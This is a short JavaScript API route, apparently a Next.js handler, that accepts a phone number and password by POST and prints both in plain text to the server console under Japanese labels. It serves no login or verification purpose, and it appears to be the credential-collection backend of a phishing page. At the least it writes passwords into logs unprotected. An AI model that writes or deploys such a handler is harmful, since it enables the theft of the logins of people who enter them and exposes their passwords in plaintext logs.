// /api/log.js
export default function handler(req, res) {
  if (req.method === 'POST') {
    const { phone, password } = req.body;
    console.log(`📱 電話番号: ${phone}`);
    console.log(`🔒 パスワード: ${password}`);
    res.status(200).json({ message: 'OK' });
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}